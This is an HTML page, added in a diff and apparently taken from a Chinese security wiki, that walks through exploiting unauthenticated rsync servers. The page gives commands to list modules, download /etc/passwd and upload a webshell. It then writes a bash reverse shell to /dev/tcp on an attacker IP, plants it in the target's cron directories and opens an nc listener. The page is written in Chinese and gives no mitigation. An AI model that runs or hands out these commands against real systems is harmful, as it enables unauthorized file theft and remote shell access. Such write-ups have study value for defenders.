@@ -1,0 +1,35 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
+		</title>
+		<style type="text/css">
+			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
+			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
+			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
+			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
+			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs5BEC2C28{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
+			.csE3F655E4{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
+			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
+			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
+			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
+			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
+		</style>
+	</head>
+	<body>
+		<h1 class="csAD577193">
+			<a name="rsync-未授权访问漏洞"><span class="csDE05BCC">Rsync </span><span class="csECDA2D3">未授权访问漏洞</span></a></h1>
+		<h2 class="cs868C439D">
+			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
+		<p class="cs40DD2BC9"><span class="cs8926E06">rsync</span><span class="cs9C1B1871">是</span><span class="cs8926E06">Linux</span><span class="cs9C1B1871">下一款数据备份工具，支持通过</span><span class="cs8926E06">rsync</span><span class="cs9C1B1871">协议、</span><span class="cs8926E06">ssh</span><span class="cs9C1B1871">协议进行远程文件传输。其中</span><span class="cs8926E06">rsync</span><span class="cs9C1B1871">协议默认监听</span><span class="cs8926E06">873</span><span class="cs9C1B1871">端口，如果目标开启了</span><span class="cs8926E06">rsync</span><span class="cs9C1B1871">服务，并且没有配置</span><span class="cs8926E06">ACL</span><span class="cs9C1B1871">或访问密码，我们将可以读写目标服务器文件。</span></p><p class="cs40DD2BC9"><span class="cs5BEC2C28">rsync</span><span class="csE3F655E4">的常用命令</span></p><p class="cs3A447A38"><span class="cs7FFD2630">列举整个同步目录或指定目录：</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">rsync ip::</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">rsync ip::xxx/</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">下载文件或目录到本地：</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">rsync -avz ip::xxx/xx.php /root</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">rsync -avz ip::xxx/ /var/tmp</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">上传文件到服务器：</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">rsync -avz webshell.php ip::web/</span></p><h2 class="cs868C439D">
+			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
+		<h2 class="cs868C439D">
+			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
+		<p class="cs40DD2BC9"><span class="cs9FB05234">nmap</span><span class="cs9C1B1871">先扫一波：</span><span class="cs8926E06"><br/><img src="Web安全/Rsync/Rsync%20%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae%e6%bc%8f%e6%b4%9e_files/image0.png" width="560" height="114" alt="" style="border-width:0px;" /></span></p><p class="cs3A447A38"><span class="cs9FB05234">rsync rsync://www.0-sec.org:873/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">rsync rsync://www.0-sec.org:873/src </span><span class="cs7FFD2630">来查看模块名列表</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">我们再列出</span><span class="cs9FB05234">src</span><span class="cs7FFD2630">模块下的文件</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">rsync rsync://www.0-sec.org:873/src/</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Rsync/Rsync%20%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae%e6%bc%8f%e6%b4%9e_files/image1.png" width="560" height="288" alt="" style="border-width:0px;" /></span></p><p class="cs3A447A38"><span class="cs7FFD2630">我们可以下载任意文件：</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">rsync -av rsync://www.0-sec.org:873/src/etc/passwd ./</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Rsync/Rsync%20%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae%e6%bc%8f%e6%b4%9e_files/image2.png" width="560" height="83" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="csE3F655E4">提权：</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">写入</span><span class="cs9FB05234">shell</span><span class="cs9C1B1871">并赋权：</span></p><p class="cs3A447A38"><span class="cs9FB05234">#!/bin/bash </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">/bin/bash -i &gt;&amp; /dev/tcp/192.168.91.128/4444 0&gt;&amp;1</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">chmod +x shell</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">将</span><span class="cs9FB05234">shell</span><span class="cs9C1B1871">上传至</span><span class="cs9FB05234">/etc/cron.hourly</span><span class="cs9C1B1871">：</span></p><p class="cs3A447A38"><span class="cs9FB05234">rsync -av shell rsync://192.168.91.130/src/etc/cron.hourly</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">rsync -av shell rsync://www.0-sec.org:873/src/etc/cron.d/shell</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Rsync/Rsync%20%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae%e6%bc%8f%e6%b4%9e_files/image3.png" width="560" height="87" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">本地监听：</span></p><p class="cs3A447A38"><span class="cs9FB05234">nc -nvv -lp 4444</span></p><h2 class="cs868C439D">
+			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
+		<p class="cs6FD73CFB"><span class="cs8926E06">https://fansonfan.github.io/2019/04/20/rsync-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</span></p></body>
+</html>
